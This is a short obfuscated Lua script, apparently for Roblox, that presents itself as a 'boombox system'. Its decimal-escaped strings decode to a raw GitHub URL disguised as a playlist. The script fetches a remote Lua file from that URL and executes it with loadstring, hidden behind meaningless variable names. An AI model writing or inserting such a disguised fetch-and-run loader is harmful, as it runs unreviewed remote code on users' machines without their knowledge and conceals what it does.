--[[ 
    NYXBLOKZ BOOMBOX SYSTEM
    PROTECTED BY NYX SERVICES 
]]

local _0x526177 = {
    [1] = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047",
    [2] = "\070\111\099\120\105\047\112\108\097\121\108\105\115\116\046\106\115\111\110\047",
    [3] = "\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\109\097\105\110\046\108\117\097"
}

local function _0xNyx()
    local _0xDec = ""
    for _0xIdx = 1, #_0x526177 do
        _0xDec = _0xDec .. _0x526177[_0xIdx]
    end
    
    local _0xS, _0xR = pcall(function()
        return game:HttpGet(_0xDec)
    end)
    
    if _0xS then
        local _0xF, _0xE = loadstring(_0xR)
        if _0xF then
            task.spawn(_0xF)
        else
            warn("\067\111\109\112\105\108\101\032\069\114\114")
        end
    end
end

_0xNyx()